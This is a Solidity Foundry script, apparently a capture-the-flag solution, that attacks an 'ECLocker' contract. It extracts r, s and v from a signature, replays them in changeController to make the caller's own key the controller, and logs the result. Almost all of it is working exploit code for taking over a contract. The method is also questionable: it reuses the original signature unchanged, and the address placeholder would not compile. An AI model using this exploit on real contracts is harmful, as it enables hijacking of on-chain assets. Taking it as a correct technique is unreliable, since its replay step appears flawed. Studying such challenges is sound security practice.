// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IECLocker {
    function changeController(
        uint8 v,
        bytes32 r,
        bytes32 s,
        address newController
    ) external;

    function controller() external view returns (address);
}

contract ECLockerExploit is Script {

    function run() external {
        address locker = 0xYOUR_LOCK_ADDRESS;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IECLocker target = IECLocker(locker);

        // -----------------------------------
        //  IMPORTANT: Replace with actual signature used in constructor
        // -----------------------------------

        bytes memory signature = hex"YOUR_SIGNATURE";

        // Extract r, s, v
        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }

        // -----------------------------------
        //  Exploit: reuse signature
        // -----------------------------------

        target.changeController(
            v,
            r,
            s,
            vm.addr(vm.envUint("PRIVATE_KEY"))
        );

        // Verify
        address newController = target.controller();
        console.log("New Controller:", newController);

        vm.stopBroadcast();
    }
}